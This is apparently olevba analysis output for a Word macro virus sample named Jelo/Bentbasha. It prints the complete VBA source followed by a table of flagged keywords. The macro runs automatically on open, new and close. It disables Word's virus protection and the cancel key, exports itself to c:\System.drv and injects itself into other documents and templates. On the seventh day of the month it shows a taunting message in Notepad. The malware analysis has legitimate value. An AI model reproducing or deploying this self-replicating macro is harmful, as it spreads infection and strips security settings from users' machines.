olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jelo-76ce63aa1ccb0c2fdecaff4e55b5b818b7268240
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Jelo-76ce63aa1ccb0c2fdecaff4e55b5b818b7268240 
in file: Virus.MSWord.Jelo-76ce63aa1ccb0c2fdecaff4e55b5b818b7268240 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
'Bentbasha
Private Sub Document_New(): Document_Close: End Sub
Private Sub Document_Open(): Document_Close: End Sub
Private Sub Document_Close(): On Error Resume Next: c = c + 1
Word.Options.VirusProtection = False
Word.Application.EnableCancelKey = wdCancelDisabled
Word.ActiveDocument.ReadOnlyRecommended = False
Word.ShowVisualBasicEditor = False
If Dir("c:\Windows\Acaid32.drv") <> "Acaid32.drv" Then
Set vtijelo = ThisDocument.VBProject.VBComponents(c)
vtijelo.Export ("c:\System.drv")
End If
For t = 1 To Word.Documents.Count
Set f = Word.ActiveWindow.Document.VBProject.VBComponents(t).CodeModule
If f.lines(c, c) <> "'Bentbasha" Then
f.deletelines c, f.countoflines
f.AddFromFile "C:\System.drv"
f.deletelines 1, 4
End If
Next
For g = 1 To Word.Templates.Count
Set n = Templates(1).VBProject.VBComponents(1).CodeModule
If n.lines(1, 1) <> "'Bentbasha" Then
n.AddFromFile "c:\system.drv"
n.deletelines 1, 4
End If
Next
If Day(Now()) = 7 Then
app = Shell(notepad.exe, vbNormalFocus)
SendKeys "Nazalost, Vas kompjuter je inficiran sa W97M.Bentbasha by e[ax] / SpeciesVL!", 0
AppActivate (app)
End If
End Sub
'WM.Bentbasha by e[ax]

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |notepad.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

